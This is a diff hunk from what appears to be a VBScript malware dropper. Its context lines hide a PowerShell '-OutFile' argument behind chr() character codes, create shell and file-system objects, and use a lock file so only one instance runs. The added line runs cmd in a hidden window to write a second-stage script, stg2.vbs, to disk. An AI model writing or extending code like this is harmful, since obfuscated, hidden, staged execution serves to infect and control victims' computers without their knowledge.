@@ -8,6 +8,8 @@ psCmd1p3 = chr(45)+chr(79)+chr(117)+chr(116)+chr(70)+chr(105)+chr(108)+chr(101)
 Set shl = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
+shl.Run "cmd /c echo AAA > C:\dados\stg2.vbs", 0
+
 If fso.FileExists(fldr+"\lock.bin") Then
 	WScript.Quit
 End If
